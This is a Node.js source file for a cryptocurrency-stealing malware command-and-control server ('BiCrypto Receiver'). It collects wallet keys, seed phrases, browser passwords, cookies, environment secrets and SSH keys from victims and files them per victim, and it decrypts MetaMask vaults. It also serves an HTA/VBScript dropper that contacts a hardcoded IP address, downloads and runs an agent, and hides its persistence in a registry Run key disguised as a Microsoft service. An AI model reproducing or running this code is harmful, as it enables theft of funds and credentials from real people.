#!/usr/bin/env node
'use strict';
// BiCrypto C2 Receiver — stripped to 5 essential endpoints
// POST /collect  — all hit beacons (JSON)
// POST /upload   — chunked file uploads
// GET  /cfgmon   — serve Windows agent (cfgmon_fixed.js)
// GET  /cfgmon_nix — serve Linux/macOS agent (nix_agent.js)
// GET  /ping     — health check

const http = require('http');
const fs   = require('fs');
const path = require('path');

const PORT_MAIN    = parseInt(process.env.PORT   || '8080');
const PORT_DROPPER = parseInt(process.env.PORT_D || '8443');
const LOOT_DIR     = process.env.LOOT_DIR || '/usr/local/src/loot';
const HITS_DIR     = path.join(LOOT_DIR, 'hits');
const VICTIMS_DIR  = path.join(LOOT_DIR, 'victims');
const CHUNKS_DIR   = path.join(LOOT_DIR, '.chunks');

const _chunkTracker = {};

const R    = '\x1b[0m';
const RED  = '\x1b[31m\x1b[1m';
const GRN  = '\x1b[32m';
const YLW  = '\x1b[33m';
const CYN  = '\x1b[36m';
const MAG  = '\x1b[35m';
const BLU  = '\x1b[34m';
const BOLD = '\x1b[1m';
const DIM  = '\x1b[2m';

const EXT_MAP = {
  'nkbihfbeogaeaoehlefnkodbefgpgknn': 'metamask',
  'ejbalbakoplchlghecdalmeeeajnimhm': 'metamask',
  'bfnaelmomeimhlpmgjnjophhpkkoljpa': 'phantom',
  'mcohilncbfahbmgdjkbpemcciiolgcge': 'coinbase',
  'hnfanknocfeofbddgcijnmhnfnkdnaad': 'tronlink',
  'fhbohimaelbohpjbbldcngcnapndodjp': 'trust',
  'egjidjbpglichdcondbcbdnbeeppgdph': 'exodus',
  'odbfpeeihdkbihmopkbjmoonfanlbfcl': 'phantom',
  'ibnejdfjmmkpcnlpebklmnkoeoihofec': 'yoroi',
  'aholpfdialjgjfhomihkjbmgjidlcdno': 'crypto-com',
  'nanjmdknhkinifnkgdcggcfnhdaammmj': 'slope',
  'fnjhmkhhmkbjkkabndcnnogagogbneec': 'ronin',
  'hpglfhgfnhbgpjdenjgmdgoeiappafln': 'guarda',
  'blnieiiffboillknjnepogjhkgnoapac': 'satoshi',
  'kpfopkelmapcoipemfendmdcghnegimn': 'liquality',
  'aiifbnbfobpmeekipheeijimdpnlpgpp': 'terra-station',
  'cgeeodpfagjceefieflmdfphplkenlfk': 'okx-wallet',
  'loinekcabhlmhjjamamciohnmiabdcap': 'other',
};

const TYPE_ALIASES = {
  'MN12': 'MNEMONIC_12', 'MN18': 'MNEMONIC_ML', 'MN24': 'MNEMONIC_24',
  'ETH_KEY': 'ETH_PRIVKEY', 'ETH_LDB': 'ETH_PRIVKEY', 'BTC_KEY': 'BTC_WIF_MAIN',
  'SOL_KEY': 'SOLANA_KEY', 'HEX64': 'HEX_KEY_64', 'PRIV_KEY': 'ETH_PRIVKEY',
  'SEED_12': 'MNEMONIC_12', 'SEED_18': 'MNEMONIC_ML', 'SEED_24': 'MNEMONIC_24',
  'HISTORY': 'HISTORY_HIT',
  'MM_VAULT': 'MM_MEM_VAULT', 'MM_VAULT_BLOB': 'MM_MEM_VAULT', 'PHISH_VAULT': 'MM_MEM_VAULT',
  'JSON_LDB': 'ETH_PRIVKEY', 'ETH_WIF': 'ETH_PRIVKEY', 'BTC_WIF': 'BTC_WIF_MAIN',
  'BTC_WIFT': 'BTC_WIF_TEST', 'XPUB': 'XPUB_XPRV', 'SOL_ADDR': 'SOL_ADDR',
};

const KEY_TYPES  = new Set([
  'ETH_PRIVKEY','BTC_WIF_MAIN','BTC_WIF_TEST','WIF_KEY',
  'SOLANA_KEY','XRP_SECRET','MNEMONIC_12','MNEMONIC_24',
  'MNEMONIC_ML','HEX_KEY_64','BASE58_LONG','XPUB_XPRV',
  'MM_DECRYPTED','MM_SEED','MM_MEM_MN','MM_MEM_VAULT','JSON_KEY',
  'EXODUS_PASS','ELEC_SEED','CHROME_MASTER_KEY',
]);
const PASS_TYPES = new Set([
  'JSON_KEY','BROWSER_PASS','CHROME_LOGIN_DB','CHROME_MASTER_KEY','CHROME_AES_KEY',
  'BROWSER_PASS_WIN','HISTORY_HIT','CHROME_PASS','CHROME_COOKIES',
]);
const ENV_TYPES  = new Set([
  'ENV_KEY','API_KEY','DB_URL','JWT_SECRET','ENV_SECRET','ENV_FILE','UUID_K','ENV_CONTENT',
]);
const CLIP_TYPES = new Set([
  'ETH_ADDR','BTC_ADDR','SOL_ADDR','XRP_ADDR','TRX_ADDR','LTC_ADDR','DASH_ADDR',
  'DOGE_ADDR','BNB_ADDR','ATOM_ADDR',
  'ETH_PRIVKEY','BTC_WIF_MAIN','BTC_WIF_TEST','MNEMONIC_12','MNEMONIC_24','MNEMONIC_ML',
  'XPUB_XPRV','KEYSTORE_JSON','WIF_JSON','SOLANA_KEY','HEX_KEY_64',
  'MM_DECRYPTED','MM_SEED','MM_MEM_MN','MM_MEM_VAULT',
  'API_KEY','RAW_CLIP',
]);

const SEV = {
  ETH_PRIVKEY: RED, BTC_WIF_MAIN: RED, WIF_KEY: RED,
  SOLANA_KEY:  RED, XRP_SECRET:   RED, MNEMONIC_12: RED,
  MNEMONIC_24: RED, MNEMONIC_ML:  RED, HEX_KEY_64: YLW,
  BASE58_LONG: YLW, XPUB_XPRV:   YLW, JSON_KEY: GRN,
  RAW_CLIP: CYN,    ENV_KEY: MAG,      API_KEY: MAG,
  DB_URL: MAG,      BROWSER_PASS: YLW, BROWSER_PASS_WIN: YLW,
  MM_DECRYPTED: RED, MM_SEED: RED, MM_MEM_MN: RED, MM_MEM_VAULT: YLW,
  EXODUS_PASS: RED, ELEC_SEED: RED, CHROME_MASTER_KEY: YLW, CHROME_AES_KEY: RED,
  ETH_ADDR: CYN,    BTC_ADDR: CYN,     SOL_ADDR: CYN, TRX_ADDR: CYN,
  HISTORY_HIT: YLW, ENV_FILE: MAG, ENV_SECRET: MAG, UUID_K: GRN,
};

const ENV_CONTENT_PATTERNS = [
  { name: 'API_KEY',     re: /(?:^|\n)(?:API_KEY|APIKEY|API_SECRET|APP_KEY)\s*=\s*([^\n\r]{8,})/gim },
  { name: 'SECRET_KEY',  re: /(?:^|\n)(?:SECRET_KEY|SECRET|APP_SECRET|MASTER_KEY)\s*=\s*([^\n\r]{8,})/gim },
  { name: 'JWT_SECRET',  re: /(?:^|\n)(?:JWT_SECRET|JWT_KEY|TOKEN_SECRET|AUTH_SECRET)\s*=\s*([^\n\r]{8,})/gim },
  { name: 'DB_URL',      re: /(?:^|\n)(?:DATABASE_URL|DB_URL|MONGO(?:DB)?_URI|REDIS_URL|POSTGRES(?:_URL)?|MYSQL_URL)\s*=\s*([^\n\r]{8,})/gim },
  { name: 'PRIVATE_KEY', re: /(?:^|\n)(?:PRIVATE_KEY|PRIVKEY|ETH_PRIVATE_KEY|MNEMONIC|SEED_PHRASE)\s*=\s*([^\n\r]{8,})/gim },
  { name: 'ACCESS_KEY',  re: /(?:^|\n)(?:ACCESS_KEY|ACCESS_TOKEN|AWS_ACCESS|AWS_SECRET|S3_KEY|GCS_KEY|CLOUD_KEY)\s*=\s*([^\n\r]{8,})/gim },
  { name: 'SMTP_PASS',   re: /(?:^|\n)(?:SMTP_PASSWORD|MAIL_PASSWORD|EMAIL_PASS|SENDGRID_API)\s*=\s*([^\n\r]{8,})/gim },
  { name: 'PAY_KEY',     re: /(?:^|\n)(?:STRIPE_SECRET|STRIPE_KEY|PAYPAL_SECRET|BRAINTREE_KEY)\s*=\s*([^\n\r]{8,})/gim },
  { name: 'OAUTH',       re: /(?:^|\n)(?:OAUTH_SECRET|CLIENT_SECRET|GOOGLE_SECRET|GITHUB_SECRET|DISCORD_TOKEN)\s*=\s*([^\n\r]{8,})/gim },
];

function mkdirs() {
  for (var i = 0; i < arguments.length; i++)
    try { fs.mkdirSync(arguments[i], { recursive: true }); } catch (_) {}
}

function lootDirs(base) {
  var wallDir = path.join(base, 'wallets');
  var extnDir = path.join(base, 'extensions');
  var docsDir = path.join(base, 'docs');
  mkdirs(base, wallDir, extnDir, docsDir);
  return {
    keysFile: path.join(base, 'privatekeys.txt'),
    passFile: path.join(base, 'passwords.txt'),
    envsFile: path.join(base, 'envs.txt'),
    clipFile: path.join(base, 'clipboard.txt'),
    mnFile:   path.join(base, 'mnemonics.txt'),
    wallDir, extnDir, docsDir,
  };
}

function classifyPath(filePath) {
  var p    = (filePath || '').replace(/\\/g, '/').toLowerCase();
  var base = path.basename(filePath || '').toLowerCase();
  for (var id in EXT_MAP) if (p.includes(id)) return { cat: 'extension', wallet: EXT_MAP[id] };
  if (p.includes('exodus'))    return { cat: 'wallet', wallet: 'exodus' };
  if (p.includes('atomic'))    return { cat: 'wallet', wallet: 'atomic' };
  if (p.includes('.bitcoin'))  return { cat: 'wallet', wallet: 'bitcoin' };
  if (p.includes('.ethereum') || p.includes('ethereum/keystore'))
                               return { cat: 'wallet', wallet: 'ethereum' };
  if (p.includes('/solana'))   return { cat: 'wallet', wallet: 'solana' };
  if (p.includes('phantom'))   return { cat: 'wallet', wallet: 'phantom' };
  if (p.includes('firefox') && p.includes('profile'))
                               return { cat: 'extension', wallet: 'firefox' };
  if (base === '.env' || /^\.env\./.test(base) || base.endsWith('.env')
      || base === 'env' || base.includes('environment'))
                               return { cat: 'env' };
  if (/^(config|settings|secrets?|credentials?|\.credentials?)(\.(json|yaml|yml|ini|cfg|conf|txt))?$/.test(base))
                               return { cat: 'creds' };
  if (/seed|mnemonic|wallet|backup|phrase|private|crypto|btc|eth|recovery|ledger|trezor|metamask/i.test(base))
                               return { cat: 'doc', wallet: 'crypto_docs' };
  return { cat: 'other' };
}

function scanEnvContent(text) {
  var hits = [];
  ENV_CONTENT_PATTERNS.forEach(function(p) {
    p.re.lastIndex = 0;
    var m;
    while ((m = p.re.exec(text)) !== null) {
      var val = (m[1] || m[0]).trim();
      if (val.length >= 8 && !val.startsWith('#'))
        hits.push({ type: p.name, value: val.substring(0, 200) });
    }
  });
  return hits;
}

function lootAppend(file, lines) {
  var existing = new Set();
  try { fs.readFileSync(file, 'utf8').split('\n').forEach(function(l){ existing.add(l.trim()); }); } catch(_){}
  var toWrite = lines.filter(function(l){ return l.trim() && !existing.has(l.trim()); });
  if (!toWrite.length) return 0;
  fs.appendFileSync(file, toWrite.join('\n') + '\n', 'utf8');
  return toWrite.length;
}

function normalise(parsed, ip) {
  var out = {
    hostname : (parsed.hostname || parsed.host || parsed.tag || ip || 'unknown'),
    user     : (parsed.user     || parsed.username || ''),
    os       : (parsed.os       || parsed.plat     || parsed.platform || ''),
    ts       : (parsed.ts       || new Date().toISOString()),
    tag      : (parsed.tag      || parsed.hostname || parsed.host || ip || 'unknown'),
    clipboard: [],
    files    : [],
    passwords: [],
    sysinfo  : parsed.sysinfo  || parsed.sys || null,
    ssh_keys : parsed.ssh_keys || [],
    env_vars : parsed.env      || {},
    raw      : parsed,
  };

  if (parsed.hit && parsed.hit.type && parsed.hit.val !== undefined) {
    var h = parsed.hit;
    out.clipboard.push({ type: h.type, values: [String(h.val)] });
  }

  if (Array.isArray(parsed.hits)) {
    parsed.hits.forEach(function(h) {
      if (h.type && h.val !== undefined)
        out.clipboard.push({ type: h.type, values: [String(h.val)] });
    });
  }

  if (Array.isArray(parsed.clipboard)) {
    parsed.clipboard.forEach(function(c) { out.clipboard.push(c); });
  }

  if (Array.isArray(parsed.files))
    out.files = parsed.files;

  if (Array.isArray(parsed.passwords))
    out.passwords = parsed.passwords;

  if (parsed.pattern && parsed.value !== undefined)
    out.clipboard.push({ type: parsed.pattern, values: [String(parsed.value)] });

  if (parsed.type && parsed.value !== undefined && !parsed.hit && !Array.isArray(parsed.clipboard) && !parsed.pattern)
    out.clipboard.push({ type: parsed.type, values: [String(parsed.value)] });

  return out;
}

function saveLoot(norm, targetDirsList) {
  var ts     = norm.ts || new Date().toISOString();
  var tag    = norm.tag || 'unknown';
  var header = '\n# ━━ ' + ts + '  |  ' + tag + ' ━━';

  var acc = { keys: [header], pass: [header], envs: [header], clip: [header], mn: [header], walls: {}, exts: {}, docs: {} };
  var counts = { keys: 0, pass: 0, envs: 0, clip: 0, mn: 0, wallets: 0, extensions: 0, docs: 0 };

  function routeType(rawType, value, src) {
    var type = TYPE_ALIASES[rawType] || rawType;
    var label = rawType !== type ? rawType + '→' + type : type;
    var line = '[' + label + ']  ' + String(value).trim() + '   # src=' + src;
    if (KEY_TYPES.has(type))  { acc.keys.push(line); counts.keys++; }
    if (PASS_TYPES.has(type)) { acc.pass.push(line); counts.pass++; }
    if (ENV_TYPES.has(type))  { acc.envs.push(line); counts.envs++; }
    if (CLIP_TYPES.has(type)) { acc.clip.push(line); counts.clip++; }
    if (/^MNEMONIC_|^MM_DECRYPTED$|^MM_SEED$|^MM_MEM_MN$|^MM_MEM_VAULT$|^MM_VAULT_BLOB$/.test(type)) {
      acc.mn.push(line); counts.mn = (counts.mn||0) + 1;
    }
  }

  norm.clipboard.forEach(function(c) {
    (c.values || []).forEach(function(v) { routeType(c.type, v, 'clipboard'); });
  });

  norm.passwords.forEach(function(p) {
    var line = 'BROWSER=' + (p.browser||'?') + ' URL=' + (p.url||'') + ' USER=' + (p.user||p.username||'') + ' PASS=' + (p.pass||p.password||'');
    acc.pass.push('[BROWSER_PASS_WIN]  ' + line + '   # src=browser_batch');
    counts.pass++;
  });

  norm.files.forEach(function(f) {
    var cls  = classifyPath(f.path);
    var base = path.basename(f.path || '');
    var disp = (f.path||'').replace(/\\/g,'/').split('/').slice(-4).join('/');
    (f.matches||[]).forEach(function(m){ (m.values||[]).forEach(function(v){ routeType(m.type, v, base); }); });
    if (f.preview) scanEnvContent(f.preview).forEach(function(h){ acc.envs.push('['+h.type+']  '+h.value+'   # src='+base); counts.envs++; });

    if (cls.cat === 'extension') {
      var n = cls.wallet || 'other';
      if (!acc.exts[n]) acc.exts[n] = ['\n# ━━ ' + ts + '  |  ' + tag + ' ━━'];
      acc.exts[n].push('PATH  ' + disp);
      if (f.preview) acc.exts[n].push('DATA  ' + f.preview.replace(/\n/g,' ').substring(0,400));
      counts.extensions++;
    } else if (cls.cat === 'wallet') {
      var wn = cls.wallet || 'other';
      if (!acc.walls[wn]) acc.walls[wn] = ['\n# ━━ ' + ts + '  |  ' + tag + ' ━━'];
      acc.walls[wn].push('PATH  ' + disp);
      if (f.preview) acc.walls[wn].push('DATA  ' + f.preview.replace(/\n/g,' ').substring(0,400));
      counts.wallets++;
    } else if (cls.cat === 'env') {
      acc.envs.push('FILE  ' + disp);
      if (f.preview) f.preview.split('\n').forEach(function(l){ var ll=l.trim(); if(ll&&!ll.startsWith('#')){ acc.envs.push('  '+ll.substring(0,300)); counts.envs++; } });
    } else if (cls.cat === 'creds') {
      if (f.preview) { acc.pass.push('FILE  '+disp); acc.pass.push('DATA  '+f.preview.replace(/\n/g,' ').substring(0,400)); counts.pass++; }
    } else if (cls.cat === 'doc') {
      var dn = cls.wallet || path.extname(base).replace('.','') || 'misc';
      if (!acc.docs[dn]) acc.docs[dn] = ['\n# ━━ ' + ts + '  |  ' + tag + ' ━━'];
      acc.docs[dn].push('PATH  ' + disp);
      if (f.preview) acc.docs[dn].push('DATA  ' + f.preview.replace(/\n/g,' ').substring(0,400));
      counts.docs++;
    }
  });

  (norm.ssh_keys || []).forEach(function(k) {
    var line = '[JSON_KEY]  ' + String(k).trim() + '   # src=ssh_key';
    acc.keys.push(line); counts.keys++;
  });

  if (norm.sysinfo) {
    acc.envs.push('[SYSINFO]  ' + JSON.stringify(norm.sysinfo).substring(0,500));
    counts.envs++;
  }
  Object.keys(norm.env_vars||{}).forEach(function(k) {
    var v = norm.env_vars[k];
    if (v && String(v).length > 3) { acc.envs.push('[ENV_KEY]  '+k+'='+String(v).substring(0,200)+'   # src=env'); counts.envs++; }
  });

  targetDirsList.forEach(function(dirs) {
    if (acc.keys.length > 1) lootAppend(dirs.keysFile, acc.keys);
    if (acc.pass.length > 1) lootAppend(dirs.passFile, acc.pass);
    if (acc.envs.length > 1) lootAppend(dirs.envsFile, acc.envs);
    if (acc.clip.length > 1 && dirs.clipFile) lootAppend(dirs.clipFile, acc.clip);
    if (acc.mn.length > 1 && dirs.mnFile)     lootAppend(dirs.mnFile,   acc.mn);
    Object.keys(acc.walls).forEach(function(n){ lootAppend(path.join(dirs.wallDir,n+'.txt'),acc.walls[n]); });
    Object.keys(acc.exts).forEach(function(n){  lootAppend(path.join(dirs.extnDir,n+'.txt'),acc.exts[n]);  });
    if (dirs.docsDir) Object.keys(acc.docs).forEach(function(n){ lootAppend(path.join(dirs.docsDir,n+'.txt'),acc.docs[n]); });
  });

  return counts;
}

// ── Collect POST body ──────────────────────────────────────────────────────────
function collectBody(req, maxBytes, cb) {
  var body = '', bytes = 0;
  req.on('data', function(chunk) {
    bytes += chunk.length;
    if (bytes > maxBytes) { req.destroy(); return; }
    body += chunk;
  });
  req.on('end', function() { cb(body); });
  req.on('error', function() {});
}

// ── Request handler ────────────────────────────────────────────────────────────
function handler(req, res, port) {
  var ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown').split(',')[0].trim();

  // ── GET /ping ──
  if (req.method === 'GET' && req.url === '/ping') {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('ok');
    return;
  }

  // ── GET /h — serve HTA dropper (mshta LOLBin, bypasses IAC/MOTW) ──
  if (req.method === 'GET' && req.url === '/h') {
    var hta = [
      '<html><head>',
      '<hta:application applicationname="Update" windowstate="minimize" showintaskbar="no" border="none" caption="no" scroll="no"/>',
      '<script language="VBScript">',
      'Sub Window_onLoad',
      '  window.resizeTo 0,0',
      '  window.moveTo -32000,-32000',
      '  On Error Resume Next',
      '  Dim C2 : C2 = "http://207.180.245.175:8080"',
      '  Dim h : Set h = CreateObject("WinHttp.WinHttpRequest.5.1")',
      '  h.Open "GET", C2 & "/cfgmon", False',
      '  h.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
      '  h.Send',
      '  If h.Status = 200 Then',
      '    Dim fs : Set fs = CreateObject("Scripting.FileSystemObject")',
      '    Dim tf : tf = fs.GetSpecialFolder(2) & "\\cfgm.js"',
      '    Dim st : Set st = fs.CreateTextFile(tf, True, False)',
      '    st.Write h.ResponseText',
      '    st.Close',
      '    Dim wsh : Set wsh = CreateObject("WScript.Shell")',
      '    Dim d : d = wsh.ExpandEnvironmentStrings("%APPDATA%") & "\\Microsoft\\Protect"',
      '    If Not fs.FolderExists(d) Then fs.CreateFolder(d)',
      '    Dim p : p = d & "\\bsvc.vbs"',
      '    Dim sv : Set sv = fs.CreateTextFile(p, True, False)',
      '    sv.WriteLine "Set h=CreateObject(""WinHttp.WinHttpRequest.5.1"")"',
      '    sv.WriteLine "h.Open ""GET"",""" & C2 & "/cfgmon"",False"',
      '    sv.WriteLine "h.Send"',
      '    sv.WriteLine "Dim fs:Set fs=CreateObject(""Scripting.FileSystemObject"")"',
      '    sv.WriteLine "Dim tf:tf=fs.GetSpecialFolder(2)&""\\" & "cfgm.js"""',
      '    sv.WriteLine "Dim st:Set st=fs.CreateTextFile(tf,True,False)"',
      '    sv.WriteLine "st.Write h.ResponseText"',
      '    sv.WriteLine "st.Close"',
      '    sv.WriteLine "CreateObject(""WScript.Shell"").Run ""cscript //B //NoLogo ""&Chr(34)&tf&Chr(34),0,False"',
      '    sv.Close',
      '    wsh.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MicrosoftProtectSvc", "wscript //B //NoLogo """ & p & """", "REG_SZ"',
      '    wsh.Run "cscript //B //NoLogo " & Chr(34) & tf & Chr(34), 0, False',
      '  End If',
      '  self.Close',
      'End Sub',
      '</script><body></body></html>'
    ].join('\n');
    res.writeHead(200, { 'Content-Type': 'application/hta' });
    res.end(hta);
    return;
  }

  // ── GET /cfgmon — serve Windows agent ──
  if (req.method === 'GET' && req.url === '/cfgmon') {
    try {
      var src = fs.readFileSync('/usr/local/src/cfgmon_fixed.js', 'utf8');
      res.writeHead(200, { 'Content-Type': 'text/plain' });
      res.end(src);
    } catch(e) {
      res.writeHead(500); res.end('');
    }
    return;
  }

  // ── GET /cfgmon_nix — serve Linux/macOS agent ──
  if (req.method === 'GET' && req.url === '/cfgmon_nix') {
    try {
      var nixSrc = fs.readFileSync('/usr/local/src/nix_agent.js', 'utf8');
      res.writeHead(200, { 'Content-Type': 'text/plain' });
      res.end(nixSrc);
    } catch(e) {
      res.writeHead(500); res.end('');
    }
    return;
  }

  // ── POST /upload — chunked file upload ──
  if (req.method === 'POST' && req.url === '/upload') {
    collectBody(req, 15 * 1024 * 1024, function(body) {
      var parsed = null;
      try { parsed = JSON.parse(body); } catch(_) {}
      if (!parsed || !parsed.filename || !parsed.data_b64) { res.writeHead(400); res.end(); return; }

      var extName   = (parsed.ext_name||'file').replace(/[^a-zA-Z0-9_-]/g,'_').substring(0,32);
      var hostname2 = (parsed.hostname||parsed.host||parsed.tag||'unknown').replace(/[^a-zA-Z0-9._-]/g,'_').substring(0,64);
      var filename2 = (parsed.filename||'file').replace(/[^a-zA-Z0-9._-]/g,'_').substring(0,64);
      var safeIp    = ip.replace(/[^0-9a-fA-F.:]/g,'_');
      var victimKey = safeIp + '_' + hostname2;
      var victimDir = path.join(VICTIMS_DIR, victimKey, 'extensions', extName);
      mkdirs(victimDir);

      var totalChunks = parsed.total_chunks || 1;
      var chunkIdx    = parsed.chunk_index  || 0;

      if (totalChunks === 1) {
        var buf = Buffer.from(parsed.data_b64, 'base64');
        fs.writeFileSync(path.join(victimDir, filename2), buf);
        console.log(CYN+'[FILE:'+port+']'+R+' '+extName+'/'+filename2+' '+buf.length+'b victim='+victimKey);
        res.writeHead(200); res.end('ok');
        return;
      }

      var chunkKey = victimKey + '|' + extName + '|' + filename2;
      var chunkDir = path.join(CHUNKS_DIR, victimKey, extName, filename2);
      mkdirs(chunkDir);

      var chunkBuf = Buffer.from(parsed.data_b64, 'base64');
      fs.writeFileSync(path.join(chunkDir, 'chunk_' + chunkIdx), chunkBuf);

      if (!_chunkTracker[chunkKey]) {
        _chunkTracker[chunkKey] = { received: new Set(), total: totalChunks, victimDir: victimDir, chunkDir: chunkDir, filename: filename2, extName: extName, fileSize: parsed.file_size || 0 };
      }
      _chunkTracker[chunkKey].received.add(chunkIdx);

      var tracker = _chunkTracker[chunkKey];
      console.log(DIM+'[CHK:'+port+'] '+extName+'/'+filename2+' chunk '+chunkIdx+'/'+totalChunks+' ('+chunkBuf.length+'b)'+R);
      res.writeHead(200); res.end('ok');

      if (tracker.received.size === totalChunks) {
        try {
          var parts = [];
          for (var ci = 0; ci < totalChunks; ci++) {
            parts.push(fs.readFileSync(path.join(chunkDir, 'chunk_' + ci)));
          }
          var assembled = Buffer.concat(parts);
          var outPath = path.join(victimDir, filename2);
          fs.writeFileSync(outPath, assembled);
          console.log(GRN+BOLD+'[FILE:'+port+'] ASSEMBLED'+R+' '+extName+'/'+filename2+' '+assembled.length+'b ('+totalChunks+' chunks) victim='+victimKey);
          try { parts.forEach(function(_,ci){ fs.unlinkSync(path.join(chunkDir,'chunk_'+ci)); }); fs.rmdirSync(chunkDir); } catch(_) {}
          delete _chunkTracker[chunkKey];
        } catch(e) {
          console.log(RED+'[CHK ERR] reassemble failed: '+e.message+R);
        }
      }
    });
    return;
  }

  // ── POST /collect — all hit beacons ──
  if (req.method === 'POST' && req.url === '/collect') {
    collectBody(req, 10 * 1024 * 1024, function(body) {
      var ts2     = new Date().toISOString().replace(/[:.]/g,'-');
      var safeIp2 = ip.replace(/[^0-9a-fA-F.:]/g,'_');
      var outFile = path.join(HITS_DIR, ts2 + '_' + safeIp2 + '.json');

      var parsed = null;
      try { parsed = JSON.parse(body); } catch(_) {}

      if (!parsed) {
        fs.writeFileSync(outFile + '.raw', body, 'utf8');
        console.log(YLW+'[RAW:'+port+']'+R+' hit from '+ip);
        res.writeHead(200); res.end('ok');
        return;
      }

      fs.writeFileSync(outFile, JSON.stringify(parsed, null, 2), 'utf8');

      // Auto-decrypt MetaMask vault if password+vault arrive together
      if (parsed.hit && parsed.hit.type === 'PHISH_VAULT' && parsed.hit.pass && parsed.hit.vault) {
        try {
          var cr = require('crypto');
          var vObj = (typeof parsed.hit.vault === 'string') ? JSON.parse(parsed.hit.vault) : parsed.hit.vault;
          var sBuf = Buffer.from(vObj.salt, 'base64');
          var iBuf = Buffer.from(vObj.iv, 'base64');
          var dBuf = Buffer.from(vObj.data, 'base64');
          cr.pbkdf2(parsed.hit.pass, sBuf, vObj.iterations || 10000, 32, 'sha256', function(err, key) {
            if (err) return;
            try {
              var dec = require('crypto').createDecipheriv('aes-256-gcm', key, iBuf);
              dec.setAuthTag(dBuf.slice(-16));
              var plain = dec.update(dBuf.slice(0, -16), '', 'utf8') + dec.final('utf8');
              var decFile = path.join(HITS_DIR, ts2 + '_' + safeIp2 + '_VAULT_DECRYPTED.txt');
              fs.writeFileSync(decFile, 'IP: '+ip+'\nWALLET: '+(parsed.hit.wallet||'?')+'\nPASS: '+parsed.hit.pass+'\nDECRYPTED:\n'+plain+'\n', 'utf8');
              console.log('\n'+RED+BOLD+'  *** VAULT DECRYPTED ***'+R+'  '+ip+'  wallet='+(parsed.hit.wallet||'?')+'\n  → '+path.basename(decFile));
            } catch(e) {}
          });
        } catch(e) {}
      }

      // Auto-save decrypted MM results
      if (parsed.hit && (parsed.hit.type === 'MM_DECRYPTED' || parsed.hit.type === 'MM_SEED' || parsed.hit.type === 'MM_MEM_MN')) {
        var decFile2 = path.join(HITS_DIR, ts2 + '_' + safeIp2 + '_' + parsed.hit.type + '.txt');
        fs.writeFileSync(decFile2, 'IP: '+ip+'\nTYPE: '+parsed.hit.type+'\n'+String(parsed.hit.val||'')+'\n', 'utf8');
        console.log('\n'+RED+BOLD+'  *** '+parsed.hit.type+' ***'+R+'  '+ip+'  → '+path.basename(decFile2));
      }

      var norm       = normalise(parsed, ip);
      var hostname2  = norm.hostname.replace(/[^a-zA-Z0-9._-]/g,'_').substring(0,64);
      var victimKey  = safeIp2 + '_' + hostname2;
      var victimBase = path.join(VICTIMS_DIR, victimKey);
      var VDIRS      = lootDirs(victimBase);

      var metaFile = path.join(victimBase, 'info.txt');
      if (!fs.existsSync(metaFile)) {
        fs.writeFileSync(metaFile,
          'ip       = '+ip+'\nhostname = '+norm.hostname+'\nfirst    = '+new Date().toISOString()+
          '\nos       = '+norm.os+'\nuser     = '+norm.user+'\n','utf8');
      } else {
        fs.appendFileSync(metaFile,'hit      = '+new Date().toISOString()+'\n','utf8');
      }

      var c = saveLoot(norm, [VDIRS]);

      console.log('\n'+'━'.repeat(72));
      console.log(GRN+BOLD+'[HIT:'+port+']'+R+' '+CYN+BOLD+(norm.tag||'?')+R+'  from '+BLU+ip+R+' os='+norm.os+' user='+norm.user);
      console.log('  victim: '+BOLD+victimKey+R);

      var summary = [];
      if (c.keys)       summary.push(RED+c.keys+' keys'+R);
      if (c.pass)       summary.push(YLW+c.pass+' passwords'+R);
      if (c.envs)       summary.push(MAG+c.envs+' env secrets'+R);
      if (c.clip)       summary.push(CYN+c.clip+' clipboard hits'+R);
      if (c.wallets)    summary.push(GRN+c.wallets+' wallet files'+R);
      if (c.extensions) summary.push(CYN+c.extensions+' extensions'+R);
      if (summary.length) console.log('  LOOT  '+summary.join('  '));

      norm.clipboard.filter(function(h){ return h.values&&h.values.length; }).forEach(function(h) {
        var col = SEV[h.type]||CYN;
        console.log('  '+(col)+h.type.padEnd(18)+R+' '+h.values[0].substring(0,80));
      });

      if (!c.keys&&!c.pass&&!c.envs&&!c.clip&&!c.wallets&&!c.extensions)
        console.log('  '+DIM+'(no structured loot — raw hit saved)'+R);
      console.log('━'.repeat(72)+'\n');

      res.writeHead(200, { 'Content-Type': 'text/plain' });
      res.end('ok');
    });
    return;
  }

  res.writeHead(404); res.end();
}

// ── Init ───────────────────────────────────────────────────────────────────────
mkdirs(LOOT_DIR, HITS_DIR, VICTIMS_DIR, CHUNKS_DIR);

http.createServer(function(req,res){ handler(req,res,PORT_MAIN);    }).listen(PORT_MAIN,    '0.0.0.0', function(){
  console.log(GRN+BOLD+'  BiCrypto Receiver'+R);
  console.log('─'.repeat(50));
  console.log('  Main port    : '+BOLD+PORT_MAIN+R);
  console.log('  Dropper port : '+BOLD+PORT_DROPPER+R);
  console.log('  Loot dir     : '+LOOT_DIR);
  console.log('─'.repeat(50));
  console.log('  Endpoints    : POST /collect  POST /upload');
  console.log('                 GET  /cfgmon   GET  /cfgmon_nix  GET /ping');
  console.log('─'.repeat(50));
  console.log(YLW+'  Waiting for hits...'+R+'\n');
});

http.createServer(function(req,res){ handler(req,res,PORT_DROPPER); }).listen(PORT_DROPPER, '0.0.0.0', function(){
  console.log(GRN+'  [+] Port '+PORT_DROPPER+' (dropper channel) ready'+R);
});

process.on('SIGINT', function() { console.log('\n[*] Shutting down.'); process.exit(0); });
process.on('uncaughtException', function(e) { console.error('[ERR] '+e.message); });
